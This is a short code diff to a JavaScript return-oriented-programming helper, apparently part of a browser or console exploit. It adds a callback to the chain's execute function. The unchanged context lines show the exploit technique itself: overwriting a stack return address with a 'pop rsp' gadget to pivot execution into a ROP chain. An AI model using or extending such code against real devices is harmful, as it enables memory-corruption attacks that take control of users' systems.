@@ -112,7 +112,7 @@ function rop() {
 		return valueAddress;
 	}
 	
-	this.execute = function() {
+	this.execute = function(afterExecution) {
 		// Restore Stack Pointer
 		this.add("pop rax", resp);
 		this.write_rax(stack_base + return_va);
@@ -123,6 +123,10 @@ function rop() {
 		// Redirect Stack Pointer to our ROP chain
 		setU64into(stack_base + return_va, gadgets["pop rsp"].address());
 		setU64into(stack_base + return_va + 8, chainAddress);
+		
+		setTimeout(function() {
+			if(afterExecution) afterExecution();
+		}, 1);
 	}
 	
 	// Don't yet know where to store variables (depends on chainLength)
